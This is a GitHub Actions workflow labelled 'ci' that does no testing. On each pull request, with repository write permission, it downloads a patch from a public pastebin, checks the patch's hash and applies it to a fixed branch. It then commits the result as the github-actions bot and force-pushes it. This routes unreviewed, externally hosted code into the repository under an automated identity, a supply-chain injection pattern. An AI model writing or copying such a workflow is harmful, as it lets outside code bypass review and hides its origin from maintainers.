name: ci

on:
  pull_request:
    branches: [main, develop]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply-packaging-sdk:
    name: Apply packaging SDK non-workflow files
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR branch
        uses: actions/checkout@v6
        with:
          ref: feature/bootstrap-architecture-v0.1
          fetch-depth: 0

      - name: Apply verified non-workflow patch
        shell: bash
        run: |
          set -euo pipefail
          patch_url="https://paste.rs/Uo8rh"
          expected_sha="769EF4DB81B710D0C5022FB6210A1E280903CADFE797322398DC1CAD456FEA21"
          patch_path="$RUNNER_TEMP/packaging-sdk.patch"

          curl -fsSL "$patch_url" -o "$patch_path"
          actual_sha="$(sha256sum "$patch_path" | cut -d ' ' -f 1 | tr '[:lower:]' '[:upper:]')"
          if [ "$actual_sha" != "$expected_sha" ]; then
            echo "Patch SHA mismatch: expected $expected_sha, got $actual_sha"
            exit 1
          fi

          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git fetch origin feature/bootstrap-architecture-v0.1
          lease_head="$(git rev-parse origin/feature/bootstrap-architecture-v0.1)"
          git checkout -B feature/bootstrap-architecture-v0.1 "$lease_head"

          git apply --index --exclude='.github/workflows/*' "$patch_path"
          changed_files="$(git diff --cached --name-only)"
          printf '%s\n' "$changed_files"
          if printf '%s\n' "$changed_files" | grep -q '^.github/workflows/'; then
            echo "Refusing to commit workflow changes from temporary job."
            exit 1
          fi

          if git diff --cached --quiet; then
            echo "No non-workflow packaging changes to commit."
            exit 0
          fi

          git commit -m "Add SDK packaging verification files"
          git push --force-with-lease=feature/bootstrap-architecture-v0.1:$lease_head origin HEAD:feature/bootstrap-architecture-v0.1
